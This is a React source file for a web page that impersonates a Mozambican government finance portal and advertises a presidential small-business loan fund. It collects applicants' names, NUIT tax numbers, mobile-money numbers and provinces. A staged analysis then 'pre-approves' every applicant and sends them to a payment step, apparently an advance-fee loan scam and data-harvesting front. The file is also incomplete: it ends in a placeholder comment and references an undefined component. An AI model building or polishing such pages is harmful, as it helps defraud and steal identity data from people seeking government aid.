import { useState, useEffect } from 'react';
import { 
  CheckCircle2,   User, 
  Loader2,
  ArrowRight,
  Settings
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import VideoPlayer from './components/VideoPlayer';
import PaymentMethod from './components/PaymentMethod';
import PaymentSuccess from './components/PaymentSuccess';
import AdminDashboard from './pages/AdminDashboard';
import { generateMetaTags } from './utils/seo';

// --- Tipos ---
type Step = 'news' | 'form' | 'analysis' | 'result' | 'payment' | 'success';
type Page = 'main' | 'admin';

interface UserData {
  id: string;
  name: string;
  nuit: string;
  phone: string;
  province: string;
  reason: string;
  amount: number;
  step: 'form' | 'analysis' | 'result' | 'payment' | 'success';
  timestamp: string;
  paymentStatus?: 'pending' | 'completed' | 'failed';
  paymentMethod?: 'mpesa' | 'emola';
  transactionId?: string;
}

const App = () => {
  const [currentPage, setCurrentPage] = useState<Page>('main');
  const [step, setStep] = useState<Step>('news');
  const [amount, setAmount] = useState(10000);
  const [userData, setUserData] = useState({
    name: '',
    nuit: '',
    phone: '',
    province: ''
  });
  const [showCandidatureButton, setShowCandidatureButton] = useState(false);
  const [paymentTransactionId, setPaymentTransactionId] = useState('');

  // Salvar dados no localStorage quando o formulário for enviado
  const saveUserData = (data: UserData) => {
    const existingData = JSON.parse(localStorage.getItem('candidates') || '[]');
    const newCandidate = {
      ...data,
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      step: 'form'
    };
    existingData.push(newCandidate);
    localStorage.setItem('candidates', JSON.stringify(existingData));
  };

  const nextStep = (s: Step) => setStep(s);

  const handleVideoComplete = () => {
    // Video finished playing
  };

  const handleCandidatureClick = () => {
    nextStep('form');
  };

  const handleFormSubmit = () => {
    const candidateData: UserData = {
      ...userData,
      amount,
      reason: document.querySelector('textarea')?.value || ''
    };
    saveUserData(candidateData);
    nextStep('analysis');
  };

  const handlePaymentComplete = (transactionId: string) => {
    setPaymentTransactionId(transactionId);
    nextStep('success');
  };

  const handleSuccessNext = () => {
    // Navigate to dashboard or next step
    console.log('Navigating to dashboard...');
  };

  const goToAdmin = () => {
    setCurrentPage('admin');
  };

  const goToMain = () => {
    setCurrentPage('main');
  };

  // Add meta tags to head
  useEffect(() => {
    const metaTags = generateMetaTags();
    const head = document.head;
    const existingMeta = head.querySelector('meta[name="description"]');
    
    if (existingMeta) {
      existingMeta.setAttribute('content', metaTags.match(/<meta name="description" content="([^"]+)"/)?.[1] || '');
    } else {
      const tempDiv = document.createElement('div');
      tempDiv.innerHTML = metaTags;
      const metaElements = tempDiv.querySelectorAll('meta');
      metaElements.forEach(meta => head.appendChild(meta));
    }
  }, []);

  if (currentPage === 'admin') {
    return <AdminDashboard onBack={goToMain} />;
  }

  return (
    <div className="min-h-screen bg-slate-50 font-sans text-slate-900">
      {/* Header Governamental */}
      <header className="bg-[#005a32] text-white border-b-4 border-yellow-400">
        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center p-1 overflow-hidden">
               <img 
                 src="/logo-governo-oficial" 
                 alt="Brasão da República de Moçambique" 
                 className="w-full h-full object-contain" 
               />
            </div>
            <div>
              <h1 className="font-bold text-sm md:text-lg leading-tight">
                REPÚBLICA DE MOÇAMBIQUE
              </h1>
              <p className="text-[10px] md:text-xs opacity-90 uppercase">Ministério da Economia e Finanças</p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <button 
              onClick={goToAdmin}
              className="flex items-center gap-2 bg-yellow-600 hover:bg-yellow-700 px-4 py-2 rounded-lg text-sm font-semibold transition-colors"
            >
              <Settings className="w-4 h-4" />
              Painel Admin
            </button>
            <div className="hidden md:block text-right">
              <p className="text-xs font-semibold uppercase tracking-wider">Portal do Cidadão</p>
              <p className="text-[10px] opacity-75 italic">"Trabalho, Unidade e Progresso"</p>
            </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8 max-w-4xl">
        <AnimatePresence mode="wait">
          {step === 'news' && (
            <motion.div 
              key="news"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="space-y-6"
            >
              <div className="bg-white p-6 rounded-lg shadow-md border-l-4 border-[#005a32]">
                <span className="bg-red-600 text-white px-2 py-1 text-xs font-bold rounded mb-2 inline-block">OFICIAL - AGOSTO 2025</span>
                <h2 className="text-3xl font-extrabold text-slate-800 leading-tight">
                  Presidente Daniel Chapo lança Fundo de Garantias Mutuárias de 40 Milhões USD
                </h2>
                <p className="text-lg text-slate-700 font-semibold mt-2">
                  Iniciativa destinada a apoiar micro, pequenas e médias empresas (MPMEs), com foco na criação de emprego para jovens e mulheres.
                </p>
                
                <div className="grid md:grid-cols-2 gap-4 my-6">
                  <div className="bg-green-50 p-4 rounded-lg border border-green-100">
                    <p className="text-xs text-green-600 uppercase font-bold">Valor do Fundo</p>
                    <p className="text-2xl font-black text-green-800">40 Milhões USD</p>
                  </div>
                  <div className="bg-yellow-50 p-4 rounded-lg border border-yellow-200">
                    <p className="text-xs text-yellow-700 uppercase font-bold">Meta de PMEs</p>
                    <p className="text-2xl font-black text-slate-800">15.000 Beneficiários</p>
                  </div>
                </div>

                <p className="text-slate-600 leading-relaxed">
                  O fundo visa alavancar o crédito bancário, facilitando o acesso ao financiamento para o setor privado e revitalizando a economia nacional. O governo também estabeleceu novas parcerias com o <strong>Banco Mundial</strong>, com um portfólio de 6 mil milhões USD para investimento público até 2031.
                </p>
              </div>

              <VideoPlayer 
                onVideoComplete={handleVideoComplete}
                showButton={showCandidatureButton}
                setShowButton={setShowCandidatureButton}
              />

              {/* Candidature button outside video area, appears after video timer */}
              {showCandidatureButton && (
                <motion.div 
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="text-center"
                >
                  <button 
                    onClick={handleCandidatureClick}
                    className="bg-[#005a32] hover:bg-[#004a29] text-white py-4 rounded-lg font-bold text-xl flex items-center justify-center gap-2 shadow-lg transition-all transform hover:translate-y-[-2px]"
                  >
                    Candidatar-se ao Empréstimo <ArrowRight />
                  </button>
                </motion.div>
              )}
            </motion.div>
          )}

          {step === 'form' && (
            <motion.div 
              key="form"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="bg-white p-8 rounded-xl shadow-xl border border-slate-200"
            >
              <h2 className="text-2xl font-bold mb-6 flex items-center gap-2 border-b pb-4">
                <User className="text-[#005a32]" /> Dados do Candidato
              </h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-sm font-semibold mb-2">Nome Completo</label>
                  <input                     type="text" 
                    className="w-full border p-3 rounded-md bg-slate-50 focus:ring-2 focus:ring-[#005a32] outline-none"
                    placeholder="Como no BI"
                    value={userData.name}
                    onChange={(e) => setUserData({...userData, name: e.target.value})}
                  />
                </div>
                <div>
                  <label className="block text-sm font-semibold mb-2">NUIT</label>
                  <input 
                    type="number"                     className="w-full border p-3 rounded-md bg-slate-50 focus:ring-2 focus:ring-[#005a32] outline-none"
                    placeholder="9 dígitos"
                    value={userData.nuit}
                    onChange={(e) => setUserData({...userData, nuit: e.target.value})}
                  />
                </div>
                <div>
                  <label className="block text-sm font-semibold mb-2">Contacto (M-Pesa/e-Mola)</label>
                  <input 
                    type="tel" 
                    className="w-full border p-3 rounded-md bg-slate-50 focus:ring-2 focus:ring-[#005a32] outline-none"
                    placeholder="84/85/82/86/87..."
                    value={userData.phone}
                    onChange={(e) => setUserData({...userData, phone: e.target.value})}
                  />
                </div>
                <div>
                  <label className="block text-sm font-semibold mb-2">Província</label>
                  <select                     className="w-full border p-3 rounded-md bg-slate-50 focus:ring-2 focus:ring-[#005a32] outline-none"
                    value={userData.province}
                    onChange={(e) => setUserData({...userData, province: e.target.value})}
                  >
                    <option value="">Selecione a província</option>
                    <option value="Maputo Cidade">Maputo Cidade</option>
                    <option value="Maputo Província">Maputo Província</option>
                    <option value="Gaza">Gaza</option>
                    <option value="Inhambane">Inhambane</option>
                    <option value="Sofala">Sofala</option>
                    <option value="Manica">Manica</option>
                    <option value="Tete">Tete</option>
                    <option value="Zambézia">Zambézia</option>
                    <option value="Nampula">Nampula</option>
                    <option value="Cabo Delgado">Cabo Delgado</option>
                    <option value="Niassa">Niassa</option>
                  </select>
                </div>
              </div>
              <div className="mt-6">
                <label className="block text-sm font-semibold mb-2">Finalidade do Empréstimo</label>
                <textarea 
                  className="w-full border p-3 rounded-md bg-slate-50 h-24 focus:ring-2 focus:ring-[#005a32] outline-none"
                  placeholder="Descreva brevemente como pretende usar o valor..."
                ></textarea>
              </div>
              <button 
                onClick={handleFormSubmit}
                disabled={!userData.name || !userData.nuit || !userData.phone || !userData.province}
                className="w-full mt-8 bg-black text-white py-4 rounded-lg font-bold hover:bg-slate-800 transition-colors disabled:opacity-50"
              >
                Submeter para Análise de Perfil
              </button>
            </motion.div>
          )}

          {step === 'analysis' && <AnalysisComponent onComplete={() => nextStep('result')} />}

          {step === 'result' && (
            <motion.div 
              key="result"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="bg-white p-8 rounded-xl shadow-xl text-center"
            >
              <div className="flex justify-center mb-6">
                <div className="bg-green-100 p-4 rounded-full">
                  <CheckCircle2 className="w-16 h-16 text-green-600" />
                </div>
              </div>
              <h2 className="text-3xl font-bold text-slate-800 mb-2">Parabéns, {userData.name.split(' ')[0]}!</h2>
              <p className="text-slate-600 mb-8">Após a análise técnica do seu NUIT e perfil socioeconómico, o seu pedido foi <span className="text-green-600 font-bold uppercase tracking-wider italic">Pré-Aprovado</span>.</p>
              
              <div className="bg-slate-50 p-6 rounded-lg border border-slate-200 mb-8">
                <label className="block text-sm font-bold text-slate-700 mb-4 uppercase">Selecione o Valor do Empréstimo Desejado:</label>
                <input 
                  type="range" 
                  min="10000" 
                  max="1000000" 
                  step="10000"                   className="w-full h-3 bg-slate-200 rounded-lg appearance-none cursor-pointer accent-[#005a32]"
                  value={amount}
                  onChange={(e) => setAmount(Number(e.target.value))}
                />
                <div className="flex justify-between mt-2 text-xs font-bold text-slate-500 uppercase">
                  <span>10.000 MT</span>
                  <span>500.000 MT</span>
                  <span>1.000.000 MT</span>
                </div>
                <div className="mt-8 bg-white p-6 rounded-md shadow-inner border border-slate-100">
                  <p className="text-sm text-slate-500">Valor Seleccionado:</p>
                  <p className="text-4xl font-black text-[#005a32]">{amount.toLocaleString()} MT</p>
                </div>
              </div>

              <button 
                onClick={() => nextStep('payment')}
                className="w-full bg-[#005a32] text-white py-4 rounded-lg font-bold text-xl hover:shadow-xl transition-all"
              >
                Confirmar e Solicitar Transferência
              </button>
            </motion.div>
          )}

          {step === 'payment' && (
            <PaymentMethod 
              amount={amount}
              onPaymentComplete={handlePaymentComplete}
            />
          )}

          {step === 'success' && (
            <PaymentSuccess 
              amount={amount}
              transactionId={paymentTransactionId}
              onNextStep={handleSuccessNext}
            />
          )}
        </AnimatePresence>
      </main>

      <footer className="mt-20 border-t border-slate-200 bg-white py-12">
        <div className="container mx-auto px-4 grid grid-cols-1 md:grid-cols-3 gap-8 text-sm text-slate-500">
          <div>
            <h4 className="font-bold text-slate-800 mb-4">Governo de Moçambique</h4>
            <p>Portal Oficial do Programa de Apoio ao Micro-Empreendedorismo.</p>
            <p className="mt-4">© 2024 - Direção Nacional do Tesouro</p>
          </div>
          <div>
            <h4 className="font-bold text-slate-800 mb-4">Links Úteis</h4>
            <ul className="space-y-2">
              <li className="hover:text-[#005a32] cursor-pointer">Constituição da República</li>
              <li className="hover:text-[#005a32] cursor-pointer">Boletim da República</li>
              <li className="hover:text-[#005a32] cursor-pointer">Transparência Fiscal</li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold text-slate-800 mb-4">Contacto</h4>
            <p>Linha Verde: 145</p>
            <p>Email: suporte.fundo@mef.gov.mz</p>
            <p className="mt-4">Praça da Marinha de Guerra, Maputo</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

// ... rest of the component remains the same ...

export default App;
